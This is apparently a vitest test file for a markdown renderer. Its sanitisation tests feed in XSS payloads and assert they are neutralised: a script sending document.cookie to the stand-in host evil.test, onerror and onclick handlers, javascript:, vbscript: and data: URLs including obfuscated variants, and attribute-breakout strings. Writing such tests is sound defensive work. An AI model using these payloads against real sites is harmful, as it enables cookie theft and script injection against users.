import { describe, expect, it } from "vitest";
import { escapeHtml, plainText, renderMarkdown, renderMarkdownDetailed, sanitizeUrl, wordCount } from "./markdown";

/**
 * The renderer's job is to make untrusted text safe to inject. These tests are written as
 * attacks first and formatting second: if one of the hostile cases ever starts producing
 * executable markup, this file is the thing that should fail.
 */

describe("sanitisation", () => {
  it("escapes raw HTML instead of passing it through", () => {
    const html = renderMarkdown("<script>window.location='https://evil.test/?c='+document.cookie</script>");
    expect(html).not.toContain("<script");
    expect(html).toContain("&lt;script&gt;");
  });

  it("neutralises event handler attributes", () => {
    const html = renderMarkdown('<img src=x onerror="alert(1)"> <div onclick="alert(2)">hi</div>');
    // the text survives (it is data), but never as live markup
    expect(html).not.toMatch(/<(img|div|script)\b/i);
    expect(html).not.toContain('onerror="');
    expect(html).toContain("&lt;img");
    expect(html).toContain("&lt;div");
  });

  it("drops javascript:, data: and vbscript: link targets", () => {
    expect(sanitizeUrl("javascript:alert(1)")).toBe("#");
    expect(sanitizeUrl("JaVaScRiPt:alert(1)")).toBe("#");
    expect(sanitizeUrl("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")).toBe("#");
    expect(sanitizeUrl("vbscript:msgbox")).toBe("#");
    // control characters and whitespace must not be able to smuggle a scheme past the check
    expect(sanitizeUrl("java\tscript:alert(1)")).toBe("#");
    expect(sanitizeUrl("  javascript:alert(1)")).toBe("#");
    // protocol-relative URLs would land on somebody else's host
    expect(sanitizeUrl("//evil.test/x.js")).toBe("#");
  });

  it("keeps http(s)/mailto/tel and same-origin paths", () => {
    expect(sanitizeUrl("https://arxiv.org/abs/1234.5678")).toBe("https://arxiv.org/abs/1234.5678");
    expect(sanitizeUrl("mailto:a@b.c")).toBe("mailto:a@b.c");
    expect(sanitizeUrl("/api/v1/runs/run_1/plot.png")).toBe("/api/v1/runs/run_1/plot.png");
    expect(sanitizeUrl("#section")).toBe("#section");
  });

  it("renders a markdown link as an inert anchor when the scheme is refused", () => {
    const { html, suppressedLinks } = renderMarkdownDetailed("[click me](javascript:alert(1))");
    expect(html).toContain('href="#"');
    expect(html).not.toContain("javascript:alert");
    expect(suppressedLinks).toBe(1);
  });

  it("always marks external links with noopener/noreferrer", () => {
    const html = renderMarkdown("[paper](https://example.com/a)");
    expect(html).toContain('rel="noopener noreferrer nofollow"');
    expect(html).toContain('target="_blank"');
  });

  it("refuses to let forged placeholders inject markup", () => {
    // The renderer stashes blocks behind private-use sentinel codepoints; input that types them
    // must not be able to point at another block's markup, so they are scrubbed before stashing.
    const forged = `\uE0000\uE001 \uE0001\uE001`;
    const html = renderMarkdown(`\`\`\`
x\n\`\`\`

${forged}`);
    expect(html).toContain("\uFFFD");
    expect(html.match(/<pre/g) ?? []).toHaveLength(1);
    expect(html).not.toMatch(/<script|onerror/i);
  });

  it("keeps TeX out of the HTML surface: no \href, no raw HTML inside math", () => {
    const html = renderMarkdown("$\\href{https://evil.test}{click}$");
    expect(html).not.toMatch(/<a\s|href="https:\/\/evil\.test"/i);
    expect(html).toContain("href"); // shown as literal text/error, not as a live anchor
  });

  it("quotes attribute values so a title cannot break out", () => {
    const html = renderMarkdown('[x](https://a.test "he said \\"<img src=q onerror=1>\\")");');
    expect(html).not.toContain("<img");
  });
});

describe("formatting", () => {
  it("renders headings, lists and tables", () => {
    const html = renderMarkdown("## Result\n\n- one\n- two\n\n| a | b |\n|---:|:--|\n| 1 | 2 |");
    expect(html).toContain("<h2>Result</h2>");
    expect(html).toContain('<ul class="md-list">');
    expect(html).toContain("<li>one</li>");
    expect(html).toContain("<li>two</li>");
    expect(html).toContain('<th style="text-align:right">a</th>');
    expect(html).toContain('text-align:left">2</td>');
  });

  it("treats inline code and fences as literal text", () => {
    const html = renderMarkdown("use `<b>` carefully\n\n```\n<b>raw</b>\n```\n");
    expect(html).toContain('<code class="inline-code">&lt;b&gt;</code>');
    expect(html).toContain("<pre class=\"code-block\"><code>&lt;b&gt;raw&lt;/b&gt;</code></pre>");
  });

  it("does not mistake currency for TeX", () => {
    const html = renderMarkdown("it costs $5 and $6 total");
    expect(html).toContain("$5 and $6");
    expect(html).not.toContain("katex");
  });

  it("renders real math with KaTeX", () => {
    const html = renderMarkdown("the period is $T = 2\\pi\\sqrt{L/g}$");
    expect(html).toContain("katex");
    expect(html).toContain("sqrt");
  });

  it("keeps fenced blocks on their own line without escaping twice", () => {
    const html = renderMarkdown("text\n\n```json\n{\"a\": 1}\n```\n\nmore");
    expect(html).toContain('data-lang="json"');
    expect(html).toContain("{&quot;a&quot;: 1}");
    expect(html).toContain("<p>more</p>");
  });

  it("plainText and wordCount ignore markup", () => {
    expect(plainText("# Title\n\n- item one\n- item two")).toBe("Title item one item two");
    expect(wordCount("**two** words")).toBe(2);
    expect(wordCount("")).toBe(0);
  });
});
